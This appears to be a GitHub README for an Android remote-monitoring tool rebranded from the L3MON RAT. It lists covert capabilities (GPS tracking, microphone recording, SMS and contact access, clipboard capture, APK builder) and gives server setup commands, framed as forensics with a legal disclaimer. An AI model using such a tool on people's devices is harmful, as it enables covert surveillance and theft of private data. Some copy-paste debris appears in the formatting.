# CYBERV-ULT — Android Remote Forensics & Monitoring Framework  
### Developed by [DetectiveAntoine](https://github.com/DetectiveAntoine) | Cybersecurity Expert & Forensic Investigator

![Logo](https://github.com/D3VL/L3MON/raw/master/server/assets/webpublic/logo.png)

---

## 🔍 Overview

**CYBERV-ULT** is a refined, powerful, and modular cloud-based Android remote management suite originally based on L3MON, now rebranded, customized, and secured for advanced forensic and cybersecurity operations.

> ⚠️ This tool is strictly intended for **educational**, **internal auditing**, and **authorized forensic analysis** only. Any unauthorized use is prohibited and subject to legal penalties.

---

## ⚙️ Key Features

- 📍 Real-Time GPS Logging  
- 🎙️ Microphone Activation & Recording  
- 📱 Call Logs, SMS Logs, and Contact List Access  
- 📲 View and Manage Installed Apps  
- 🔔 Live Clipboard & Notification Capture  
- 🗂️ File Explorer with Download Capabilities  
- 📡 WiFi Network History Logs  
- 🛠️ Custom APK Builder for Controlled Deployment  
- 📋 Command Queuing Engine for Batch Actions  

---

## 🛠️ System Requirements

- **Java Runtime Environment 8**
- **Node.js**
- **PM2 (Process Manager)**
- **Linux or Termux-supported System (e.g., Kali Linux)**

---

## 🚀 Installation

### For Linux/Kali:
```bash
# Install dependencies
sudo apt update && sudo apt install wget curl git npm nodejs openjdk-8-jdk openjdk-8-jre

# Clone the repository
git clone https://github.com/DetectiveAntoine/CYBERV-ULT.git && cd CYBERV-ULT

# Install packages
npm install -g pm2
npm install

# Start the server
pm2 start index.js
pm2 startup
Set Admin Login
bash
Copy
Edit
pm2 stop index
nano maindb.json

# Create MD5 hash for password
echo -n yourpassword | openssl md5 | awk '{print $2}'

# Update admin block with:
"admin": {
  "username": "admin",
  "password": "md5_hash_here"
}

# Restart
pm2 restart all
Then open your browser:

cpp
Copy
Edit
http://127.0.0.1:22533
🖼️ Screenshots
Dashboard	GPS Log	SMS View
		

✅ Use Cases
🕵️ Forensic Mobile Investigations

🔐 Incident Response Simulations

🧪 Android App Behavior Analysis in Labs

📡 Secure Device Monitoring for Research Purposes

📚 Credits & Technologies
Based on L3MON by D3VL

Inspired by AhMyth Android RAT

Uses:

Node.js, Express.js, Socket.io, LowDB

Leaflet & OpenStreetMap

PM2 for process management

⚖️ Legal & Disclaimer
CYBERV-ULT is distributed for educational and legal use only.
Any use of this tool on unauthorized devices or networks is strictly forbidden.
The author (DetectiveAntoine) is not liable for misuse or damages arising from this tool.

💼 About the Author
DetectiveAntoine
Cybersecurity Analyst | Forensics Specialist
📍 Nairobi, Kenya
🔐 GitHub Profile
